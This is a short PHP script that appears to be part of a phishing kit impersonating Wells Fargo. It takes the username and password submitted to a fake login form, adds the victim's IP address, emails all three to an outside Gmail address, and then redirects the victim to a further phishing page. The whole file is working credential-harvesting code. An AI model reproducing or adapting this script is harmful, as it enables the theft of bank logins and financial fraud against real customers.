<?

$ip = getenv("REMOTE_ADDR");
$message .= "---:||Wellsfargo||:---\n";
$message .= "Username : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "----Ownedby|v!nc3----\n";
$recipient = "ehresale1948@gmail.com";
$subject = "Wells-$ip";
$headers = "From: wells";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header("Location: identity.php");
?>